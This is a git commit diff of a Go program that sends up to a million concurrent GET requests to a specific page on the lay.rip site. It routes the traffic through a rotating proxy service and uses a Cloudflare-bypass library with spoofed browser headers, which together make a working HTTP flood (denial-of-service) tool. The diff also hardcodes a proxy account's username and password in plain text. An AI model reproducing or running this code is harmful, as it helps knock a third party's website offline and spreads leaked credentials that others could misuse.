89b354120fbac20b455c5fc2065596272a8f18cb
woosh <51231397+w8y@users.noreply.github.com>
2023-02-05 15:32:41 +0000

    Update main.go

--- main.go
+++ main.go
@@ -7,12 +7,13 @@ import (
 	"sync"
 	"os"
 	"github.com/DaRealFreak/cloudflare-bp-go"
+	// "math/rand"
 )
 
 func main() {
-	url := "https://lay.rip/abstract"
-	os.Setenv("HTTP_PROXY", "http://65.109.121.46:51080")
-	os.Setenv("HTTPS_PROXY", "http://65.109.121.46:51080")
+	url := "https://lay.rip/snep"
+	os.Setenv("HTTP_PROXY", "http://brd-customer-hl_8e3cfc05-zone-zone1:20b7sqdpne8i@zproxy.lum-superproxy.io:22225")
+	os.Setenv("HTTPS_PROXY", "http://brd-customer-hl_8e3cfc05-zone-zone1:20b7sqdpne8i@zproxy.lum-superproxy.io:22225")
 	var wg sync.WaitGroup
 	semaphore := make(chan struct{}, 500)
 	for i := 0; i < 1000000; i++ {
@@ -20,7 +21,6 @@ func main() {
 		go func() {
 			defer wg.Done()
 			semaphore <- struct{}{}
-
 			req, err := http.NewRequest("GET", url, nil)
 			if err != nil {
 				fmt.Println(err)
@@ -30,14 +30,11 @@ func main() {
 
 			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3")
 			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-			req.Header.Set("Referer", url)
 			req.Header.Set("Accept-Language", "en-US")
 			req.Header.Set("Upgrade-Insecure-Requests", "1")
 			req.Header.Set("Cache-Control", "max-age=0")
 			req.Header.Set("DNT", "1")
 			req.Header.Set("Connection", "keep-alive")
-
-
 
 			client := &http.Client{}
 			client.Transport = &http.Transport{Proxy: http.ProxyFromEnvironment} // use proxy
@@ -58,6 +55,7 @@ func main() {
 			//}
 
 			// fmt.Println(string(body))
+			fmt.Println("URL:", resp.Request.URL)
 			fmt.Println("Status code:", resp.StatusCode)
 			<-semaphore
 		}()
